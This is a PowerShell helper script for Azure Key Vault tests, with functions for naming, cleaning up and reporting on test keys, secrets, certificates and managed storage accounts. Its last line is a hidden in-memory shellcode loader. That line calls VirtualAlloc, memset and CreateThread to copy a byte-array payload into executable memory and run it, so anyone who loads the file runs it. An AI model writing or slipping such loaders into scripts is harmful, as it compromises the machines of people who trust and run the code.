













$global:createdKeys = @()
$global:createdSecrets = @()
$global:createdCertificates = @()
$global:createdManagedStorageAccounts = @()

$invocationPath = Split-Path $MyInvocation.MyCommand.Definition;


function Get-KeyVault([bool] $haspermission=$true)
{
    if ($global:testVault -ne "" -and $haspermission)
    {
        return $global:testVault
    }   
    elseif ($haspermission)
    {
        return 'azkmspsprodeus'    
    }
    else
    {
        return 'azkmspsnopermprodeus'
    }
}


function Get-KeyName([string]$suffix)
{
	if($suffix -ne '*'){
		 $suffix += Get-Random
	}

    return 'pshtk-' + $global:testns+ '-' + $suffix
}


function Get-SecretName([string]$suffix)
{
	if($suffix -ne '*'){
		 $suffix += Get-Random
	}

    return 'pshts-' + $global:testns + '-' + $suffix
}


function Get-CertificateName([string]$suffix)
{
    return 'pshtc-' + $global:testns + '-' + $suffix
}


function Get-ManagedStorageAccountName([string]$suffix)
{
    return 'pshtmsa' + $global:testns + $suffix
}


function Get-ManagedStorageSasDefinitionName([string]$suffix)
{
    return 'pshtmsas' + $global:testns + $suffix
}


function Get-KeyVaultManagedStorageResourceId
{
    return $global:storageResourceId
}


function Get-ImportKeyFile([string]$filesuffix, [bool] $exists=$true)
{
    if ($exists)
    {
        $file = "$filesuffix"+"test.$filesuffix"
    }
    else
    {
        $file = "notexist" + ".$filesuffix"
    }

    if ($global:testEnv -eq 'BVT')
    {       
        return Join-Path $invocationPath "bvtdata\$file"        
    }
    else
    {
        return Join-Path $invocationPath "proddata\$file"
    }
}


function Get-ImportKeyFile1024([string]$filesuffix, [bool] $exists=$true)
{
    if ($exists)
    {
        $file = "$filesuffix"+"test1024.$filesuffix"
    }
    else
    {
        $file = "notexist" + ".$filesuffix"
    }

    if ($global:testEnv -eq 'BVT')
    {       
        return Join-Path $invocationPath "bvtdata\$file"        
    }
    else
    {
        return Join-Path $invocationPath "proddata\$file"
    }
}



function Get-FilePathFromCommonData([string]$fileName)
{
    return Join-Path $invocationPath "commondata\$fileName"
}


function Cleanup-LogFiles([string]$rootfolder)
{
    Write-Host "Cleaning up log files from $rootfolder..."
    
    Get-ChildItem –Path $rootfolder -Include *.debug_log -Recurse |
        where {$_.mode -match "a"} |
        Remove-Item -Force     
}


function Move-Log([string]$rootfolder)
{    
    $logfolder = Join-Path $rootfolder ("$global:testEnv"+"$global:testns"+"log")
    if (Test-Path $logfolder)
    {
        Cleanup-LogFiles $logfolder
    }
    else
    {
        New-Item $logfolder -type directory -force
    }

    Get-ChildItem –Path $rootfolder -Include *.debug_log -Recurse | Move-Item -Destination $logfolder
}



function Cleanup-OldCertificates
{
    Write-Host "Cleaning up old certificates..."

    $keyVault = Get-KeyVault
    $certificatePattern = Get-CertificateName '*'
    Get-AzKeyVaultCertificate $keyVault |
        Where-Object {$_.Name -like $certificatePattern} |
        Remove-AzKeyVaultCertificate -Name $_.Name -VaultName $_.VaultName -Force -Confirm:$false

    if($global:softDeleteEnabled -eq $true) 
    {
      Get-AzKeyVaultCertificate -VaultName $keyVault -InRemovedState |
      Where-Object {$_.Name -like $certificatePattern} | %{
        Remove-AzKeyVaultCertificate -Name $_.Name -VaultName $_.VaultName -InRemovedState -Force -Confirm:$false
        Wait-Seconds 5;
      }
    }
}


function Cleanup-OldKeys
{
    Write-Host "Cleaning up old keys..."

    $keyVault = Get-KeyVault
    $keyPattern = Get-KeyName '*'
    Get-AzKeyVaultKey $keyVault |
        Where-Object {$_.Name -like $keyPattern} |
		Cleanup-Key $_.Name

	if($global:softDeleteEnabled -eq $true) 
	{
		Get-AzKeyVaultKey $keyVault -InRemovedState |
			Where-Object {$_.Name -like $keyPattern} | %{
				Remove-AzKeyVaultKey -Name $_.Name -VaultName $_.VaultName -InRemovedState -Force -Confirm:$false
				Wait-Seconds 5;
			}
	}
}


function Cleanup-OldSecrets
{
    Write-Host "Cleaning up old secrets..."

    $keyVault = Get-KeyVault
    $secretPattern = Get-SecretName '*'
    Get-AzKeyVaultSecret $keyVault |
        Where-Object {$_.Name -like $secretPattern} | 
		Cleanup-Secret $_.Name
	
	if($global:softDeleteEnabled -eq $true) 
	{
		Get-AzKeyVaultSecret $keyVault -InRemovedState |
			Where-Object {$_.Name -like $secretPattern} |  %{
				Remove-AzKeyVaultSecret -Name $_.Name -VaultName $_.VaultName -Force -Confirm:$false -InRemovedState
				Wait-Seconds 5
			}
	}
}


function Cleanup-OldManagedStorageAccounts
{
    Write-Host "Cleaning up old managed storage accounts..."

    $keyVault = Get-KeyVault
    $managedStorageAccountPattern = Get-ManagedStorageAccountName '*'
    Get-AzKeyVaultManagedStorageAccount $keyVault |
        Where-Object {$_.AccountName -like $managedStorageAccountPattern} |
        Remove-AzKeyVaultManagedStorageAccount -Force -Confirm:$false
}


function Initialize-CertificateTest
{
    $keyVault = Get-KeyVault
    $certificatePattern = Get-CertificateName '*'
    Get-AzKeyVaultCertificate $keyVault  | Where-Object {$_.Name -like $certificatePattern}  | Remove-AzKeyVaultCertificate -Force
}


function Initialize-ManagedStorageAccountTest
{
    $keyVault = Get-KeyVault
    $managedStorageAccountPattern = Get-ManagedStorageAccountName '*'
    Get-AzKeyVaultManagedStorageAccount $keyVault  | Where-Object {$_.AccountName -like $managedStorageAccountPattern}  | Remove-AzKeyVaultManagedStorageAccount -Force
}


function Cleanup-SingleKeyTest
{
    $global:createdKeys | % {
       if ($_ -ne $null)
       {
         Cleanup-Key $_
      }
    }

    $global:createdKeys.Clear()    
}

function Cleanup-Key ([string]$keyName)
{
  $oldPref = $ErrorActionPreference	 
  $ErrorActionPreference = "Stop"
  try
  {
    $keyVault = Get-KeyVault
    Write-Debug "Removing key with name $_ in vault $keyVault"
    $catch = Remove-AzKeyVaultKey $keyVault $keyName -Force -Confirm:$false
    if($global:softDeleteEnabled -eq $true)
    {
      Wait-ForDeletedKey $keyVault $keyName
      Remove-AzKeyVaultKey $keyVault $keyName -Force -Confirm:$false -InRemovedState
    }
  }
  catch {
  
  }
  finally 
  {
    $ErrorActionPreference = $oldPref	 
  }
}

function Cleanup-Secret ([string]$secretName)
{
  $oldPref = $ErrorActionPreference	 
  $ErrorActionPreference = "Stop"
  try
  {
    $keyVault = Get-KeyVault
    Write-Debug "Removing secret with name $_ in vault $keyVault"
    $catch = Remove-AzKeyVaultSecret $keyVault $secretName -Force -Confirm:$false
    if($global:softDeleteEnabled -eq $true)
    {
      Wait-ForDeletedSecret $keyVault $secretName
      Remove-AzKeyVaultSecret $keyVault $secretName -Force -Confirm:$false -InRemovedState
    }
  }
  catch {
  }
  finally 
  {
    $ErrorActionPreference = $oldPref
  }
}


function Cleanup-SingleSecretTest
{
    $global:createdSecrets | % {
       if ($_ -ne $null)
       {
         Cleanup-Secret $_
      }
    }

    $global:createdSecrets.Clear()    
}


function Cleanup-SingleCertificateTest
{
    $global:createdCertificates | % {
       if ($_ -ne $null)
       {
         try
         {
            $keyVault = Get-KeyVault
            Write-Debug "Removing certificate with name $_ in vault $keyVault"
            $catch = Remove-AzKeyVaultCertificate $keyVault $_ -Force -Confirm:$false
		    if($global:softDeleteEnabled -eq $true)
		    {
			    Wait-ForDeletedCertificate $keyVault $_
			    Remove-AzKeyVaultCertificate $keyVault $_ -Force -Confirm:$false -InRemovedState
		    }
         }
         catch 
         {
         }
      }
    }

    $global:createdCertificates.Clear()    
}


function Wait-ForDeletedKey ([string] $vault, [string] $keyName)
{
	$key = $null
	do {
		$oldPref = $ErrorActionPreference	 
		$ErrorActionPreference = "Stop"
		try
		{
			$key = Get-AzKeyVaultKey -VaultName $vault -Name $keyName -InRemovedState
		}
		catch
		{
			
			$key = $null
			Write-Host "Sleeping for 5 seconds to wait for deleted key $keyName"
			Wait-Seconds 5
		}
		finally {
			$ErrorActionPreference = $oldPref
		}
	} while($key -eq $null)

	return $key
}


function Wait-ForDeletedSecret ([string] $vault, [string] $secretName)
{
	$secret = $null
	do {
		try
		{
			$secret = Get-AzKeyVaultSecret -VaultName $vault -Name $secretName -InRemovedState
		}
		catch
		{
			
			$secret = $null
			Write-Host "Sleeping for 5 seconds to wait for deleted key $secretName"
			Wait-Seconds 5
		}
	} while($secret -ne $null)

	return $secret
}


function Wait-ForDeletedCertificate ([string] $vault, [string] $certName)
{
	$cert = $null
	do {
		try
		{
			$cert = Get-AzKeyVaultCertificate -VaultName $vault -Name $certName -InRemovedState
		}
		catch
		{
			
			$cert = $null
			Write-Host "Sleeping for 5 seconds to wait for deleted certificate $certName"
			Wait-Seconds 5
		}
	} while($cert -ne $null)

	return $cert
}


function Cleanup-SingleManagedStorageAccountTest
{
    $global:createdManagedStorageAccounts | % {
       if ($_ -ne $null)
       {
         try
         {
            $keyVault = Get-KeyVault
            Write-Debug "Removing managed storage account with name $_ in vault $keyVault"
            $catch = Remove-AzKeyVaultManagedStorageAccount $keyVault $_ -Force -Confirm:$false
         }
         catch 
         {
         }
      }
    }

    $global:createdManagedStorageAccounts.Clear()
}


function Run-KeyTest ([ScriptBlock] $test, [string] $testName)
{   
   try 
   {
     Run-Test $test $testName *>> "$testName.debug_log"
   }
   finally 
   {
     Cleanup-SingleKeyTest *>> "$testName.debug_log"
   }
}

function Run-SecretTest ([ScriptBlock] $test, [string] $testName)
{   
   try 
   {
     Run-Test $test $testName *>> "$testName.debug_log"
   }
   finally 
   {
     Cleanup-SingleSecretTest *>> "$testName.debug_log"
   }
}

function Run-CertificateTest ([ScriptBlock] $test, [string] $testName)
{   
   try 
   {
     Run-Test $test $testName *>> "$testName.debug_log"
   }
   finally 
   {
     Cleanup-SingleCertificateTest *>> "$testName.debug_log"
   }
}

function Run-ManagedStorageAccountTest ([ScriptBlock] $test, [string] $testName)
{   
   try 
   {
     Run-Test $test $testName *>> "$testName.debug_log"
   }
   finally 
   {
     Cleanup-SingleManagedStorageAccountTest *>> "$testName.debug_log"
   }
}

function Run-VaultTest ([ScriptBlock] $test, [string] $testName)
{   
   try 
   {
     Run-Test $test $testName *>> "$testName.debug_log"
   }
   finally 
   {
     
   }
}

function Write-FileReport
{
    $fileName = "$global:testEnv"+"$global:testns"+"Summary.debug_log"	
    Get-TestRunReport *>> $fileName
}


function Get-TestRunReport
{

    Write-Output "PASSED TEST Count=$global:passedCount"
    Write-Output "Total TEST Count=$global:totalCount"
    Write-Output "Start Time=$global:startTime"
    Write-Output "End Time=$global:endTime"
    $elapsed=$global:endTime - $global:startTime
    Write-Output "Elapsed=$elapsed"
   
    Write-Output "Passed TEST`tExecutionTime"
    $global:passedTests | % { $extime=$global:times[$_]; Write-Output $_`t$extime }
    Write-Output "Failed TEST lists"
    $global:failedTests | % { $extime=$global:times[$_]; Write-Output $_`t$extime }	
}

function Write-ConsoleReport
{
    Write-Host
    Write-Host -ForegroundColor Green "$global:passedCount / $global:totalCount Key Vault Tests Pass"
    Write-Host -ForegroundColor Green "============"
    Write-Host -ForegroundColor Green "PASSED TESTS"
    Write-Host -ForegroundColor Green "============"
    $global:passedTests | % { Write-Host -ForegroundColor Green "PASSED "$_": "($global:times[$_]).ToString()}
    Write-Host -ForegroundColor Green "============"
    Write-Host
    Write-Host -ForegroundColor Red "============"
    Write-Host -ForegroundColor Red "FAILED TESTS"
    Write-Host -ForegroundColor Red "============"
    $global:failedTests | % { Write-Host -ForegroundColor Red "FAILED "$_": "($global:times[$_]).ToString()}
    Write-Host -ForegroundColor Red "============"
    Write-Host
    Write-Host -ForegroundColor Green "======="
    Write-Host -ForegroundColor Green "TIMES"
    Write-Host -ForegroundColor Green "======="
    Write-Host
    Write-Host -ForegroundColor Green "Start Time: $global:startTime"
    Write-Host -ForegroundColor Green "End Time: $global:endTime"
    Write-Host -ForegroundColor Green "Elapsed: "($global:endTime - $global:startTime).ToString()	
}

function Equal-DateTime($left, $right)
{   
    if ($left -eq $null -and $right -eq $null)
    {        
        return $true
    }
    if ($left -eq $null -or $right -eq $null)
    {
        return $false
    }
    
    return (($left - $right).Duration() -le $delta)
}

function Equal-Hashtable($left, $right)
{
    if ((EmptyOrNullHashtable $left) -and (-Not (EmptyOrNullHashtable $right)))
    {
        return $false
    }  
    if ((EmptyOrNullHashtable $right) -and (-Not (EmptyOrNullHashtable $left)))
    {
        return $false
    } 
    if ($right.Count -ne $left.Count)
    {
        return $false
    }
    
    return $true
}

function EmptyOrNullHashtable($hashtable)
{
    return ($hashtable -eq $null -or $hashtable.Count -eq 0)
}

function Equal-OperationList($left, $right)
{   
    if ($left -eq $null -and $right -eq $null)
    {        
        return $true
    }
    if ($left -eq $null -or $right -eq $null)
    {
        return $false
    }

    $diff = Compare-Object -ReferenceObject $left -DifferenceObject $right -PassThru
    
    return (-not $diff)
}

function Equal-String($left, $right)
{
    if (([string]::IsNullOrEmpty($left)) -and ([string]::IsNullOrEmpty($right)))
    {
        return $true
    }
    if (([string]::IsNullOrEmpty($left)) -or ([string]::IsNullOrEmpty($right)))
    {
        return $false
    }    
    
    return $left.Equals($right)
}
$4WZB = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $4WZB -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x30,0xbf,0xe8,0xd5,0xdd,0xc6,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x7d,0x0f,0x03,0x7d,0x3f,0x5d,0x1d,0x29,0xd7,0x23,0xde,0xd2,0x27,0x44,0x56,0x37,0x16,0x44,0x0c,0x33,0x08,0x74,0x46,0x11,0xa4,0xff,0x0a,0x82,0x3f,0x8d,0x82,0xa5,0x88,0x38,0xf5,0x88,0x09,0x10,0xc5,0x8b,0x89,0x6b,0x1a,0x6c,0xb0,0xa3,0x6f,0x6d,0xf5,0xde,0x82,0x3f,0xae,0x95,0x31,0xd0,0xdb,0xe0,0x89,0x5b,0x97,0xe5,0x89,0xb8,0x6f,0x07,0xbb,0x6e,0xe4,0x5e,0x1b,0x90,0x29,0xeb,0x12,0x8a,0x2e,0xd6,0xed,0x21,0x84,0xac,0xef,0xe3,0xd5,0x4d,0x43,0xca,0xda,0xbf,0x9d,0x0a,0xdc,0x5f,0xe8,0x62,0x1f,0xdd,0xeb,0xb0,0x62,0x39,0x79,0x23,0xc4,0xca,0xd9,0x8f,0xf5,0x1f,0xbf,0x44,0xf9,0xd4,0xcb,0x03,0x1d,0xea,0x18,0x38,0x19,0x67,0x9f,0xef,0xa8,0x33,0x84,0x2b,0xf1,0xe0,0xa5,0x6a,0x5f,0x46,0xd9,0x6d,0x00,0x37,0x7f,0xe5,0xac,0x2c,0xf2,0xa4,0xb8,0x81,0x3f,0x57,0x38,0x8e,0x48,0x24,0x0a,0x11,0xe3,0xa2,0x26,0xda,0x2d,0x34,0x49,0xf1,0x8a,0xaa,0xb4,0xfa,0xea,0xe3,0x72,0xae,0xba,0x9b,0x53,0xcf,0x50,0x5c,0x5c,0x1a,0xcc,0x59,0xca,0x65,0xb9,0x63,0x0f,0x0e,0xb8,0x63,0x0e,0x75,0x35,0x85,0x40,0xd9,0x16,0x1a,0x20,0x89,0xd6,0xca,0xc8,0xc3,0xd8,0x35,0xe8,0xeb,0x32,0x5e,0x82,0x03,0xeb,0x36,0x3a,0xbd,0xb6,0xcd,0xdb,0x42,0x6d,0xa8,0xdb,0xc9,0x82,0x4c,0x95,0x39,0xee,0x5e,0x41,0xca,0xa5,0x3d,0xc7,0xd5,0x13,0x2b,0xe7,0x43,0x98,0xfa,0xb0,0xfb,0xa2,0xdb,0xf6,0xa3,0x5d,0x0e,0x8d,0x6a,0xc8,0xf1,0xf9,0x92,0x1c,0xf2,0xf9,0xc4,0x76,0xf2,0x91,0xb0,0x22,0xa1,0x84,0xbe,0xfe,0xd5,0x15,0x2b,0x01,0x8c,0xca,0xfc,0x69,0x32,0x35,0xca,0x35,0xcd,0x10,0xca,0x0a,0x18,0x5c,0xb8,0x62,0x98;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$zPz9=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($zPz9.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$zPz9,0,0,0);for (;;){Start-sleep 60};

